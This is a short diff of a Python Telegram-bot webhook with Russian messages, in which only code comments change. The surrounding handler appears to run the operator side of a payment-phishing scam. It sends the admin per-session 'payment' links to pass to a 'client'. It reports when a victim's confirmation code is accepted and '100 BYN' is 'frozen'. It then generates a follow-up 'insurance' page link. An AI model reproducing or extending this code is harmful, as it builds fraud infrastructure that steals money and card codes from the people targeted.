@@ -76,7 +76,7 @@ def webhook():
             
         elif callback_data.startswith('payment:'):
             session_id = callback_data.split(':')[1]
-            link = f"{SITE_URL}/page_63860/?session={session_id}"
+            link = f"{SITE_URL}/page_63860/?session={session_id}"   # ИСПРАВЛЕНО
             send_callback_answer(callback_id, "✅ Ссылка на оплату")
             send_to_admin(f"💳 <b>Ссылка на оплату</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.")
             
@@ -122,7 +122,6 @@ def webhook():
             send_callback_answer(callback_id, "✅ Код подтверждён")
             send_to_admin(f"✅ <b>КОД ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}\n💰 100 BYN заморожены")
             
-            # Кнопка на страховку
             insurance_link = f"{SITE_URL}/page_insurance/?session={session_id}"
             insurance_keyboard = {
                 "inline_keyboard": [
